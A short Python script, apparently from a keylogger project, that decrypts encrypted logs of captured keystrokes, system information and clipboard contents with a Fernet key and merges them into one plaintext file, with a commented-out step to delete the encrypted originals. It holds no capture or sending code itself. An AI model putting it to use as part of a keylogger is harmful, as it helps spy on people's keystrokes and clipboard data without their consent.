from cryptography.fernet import Fernet
import os

with open("encryption_key.txt", 'rb') as f:
    key = f.read()

file_path = "D:\\My GitHub\\rachit404\\python_keylogger\\MainProject\\"
keys_information_e = "e_keys_log.txt"
system_information_e = "e_system_info.txt"
clipboard_information_e = "e_clipboard.txt"

encrypted_file_names = [file_path + system_information_e,
                        file_path + clipboard_information_e,
                        file_path + keys_information_e]
count = 0

with open("decryption.txt", 'w') as f:
    f.write("")

for file in encrypted_file_names:
    with open(encrypted_file_names[count], 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)
    with open("decryption.txt", 'ab') as f:
        f.write(decrypted)
    count += 1

# for file in encrypted_file_names:
#     os.remove(file)